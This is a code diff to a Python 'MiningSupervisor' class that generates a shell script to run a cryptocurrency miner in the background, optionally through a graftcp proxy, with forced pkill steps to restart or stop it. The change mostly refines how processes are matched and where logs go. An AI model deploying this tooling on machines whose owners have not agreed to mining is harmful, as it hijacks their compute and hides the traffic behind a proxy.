@@ -386,13 +386,14 @@ class MiningSupervisor:
 
         # Generate standalone physical start_mining.sh in ~/workspace/gaszep/start_mining.sh
         start_script = os.path.join(MINING_DIR, "start_mining.sh")
+        log_file = os.path.expanduser("~/workspace/gasdag.log")
         if use_proxy:
             sh_lines = [
                 "#!/bin/bash",
                 "DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" >/dev/null 2>&1 && pwd)\"",
                 "cd \"$DIR\" || exit 1",
-                "pkill -9 -f graftcp-local 2>/dev/null || true",
-                "pkill -9 -f gasdag 2>/dev/null || true",
+                "pkill -9 -x graftcp-local 2>/dev/null || true",
+                "pkill -9 -x gasdag 2>/dev/null || true",
                 "sleep 0.2",
                 "cat > graftcp/local/graftcp-local.conf <<EOF",
                 "listen = :2233",
@@ -405,7 +406,7 @@ class MiningSupervisor:
                 "./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &",
                 "sleep 0.3",
                 "./graftcp/graftcp curl -s ifconfig.me >/dev/null 2>&1 || true",
-                f"nohup ./graftcp/graftcp ./gasdag -a {algo} -o {pool} -u {worker_id} -p x {cpu_arg} > ~/workspace/gasdag.log 2>&1 &",
+                f"nohup ./graftcp/graftcp ./gasdag -a {algo} -o {pool} -u {worker_id} -p x -l {log_file} {cpu_arg} > {log_file} 2>&1 &",
                 "echo 'START_MINING_SH_SUCCESS'"
             ]
         else:
@@ -413,10 +414,10 @@ class MiningSupervisor:
                 "#!/bin/bash",
                 "DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" >/dev/null 2>&1 && pwd)\"",
                 "cd \"$DIR\" || exit 1",
-                "pkill -9 -f gasdag 2>/dev/null || true",
+                "pkill -9 -x gasdag 2>/dev/null || true",
                 "sleep 0.2",
                 "chmod +x gasdag 2>/dev/null || true",
-                f"nohup ./gasdag -a {algo} -o {pool} -u {worker_id} -p x {cpu_arg} > ~/workspace/gasdag.log 2>&1 &",
+                f"nohup ./gasdag -a {algo} -o {pool} -u {worker_id} -p x -l {log_file} {cpu_arg} > {log_file} 2>&1 &",
                 "echo 'START_MINING_SH_SUCCESS'"
             ]
 
@@ -442,8 +443,9 @@ class MiningSupervisor:
                     os.remove(MINING_CONF_FILE)
                 except Exception:
                     pass
-            subprocess.run(["pkill", "-9", "-f", "gasdag"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            subprocess.run(["pkill", "-9", "-f", "graftcp"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.run(["pkill", "-9", "-x", "gasdag"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.run(["pkill", "-9", "-x", "graftcp"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.run(["pkill", "-9", "-x", "graftcp-local"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             self.active_process = None
             return "Mining stopped."
         except Exception as e:
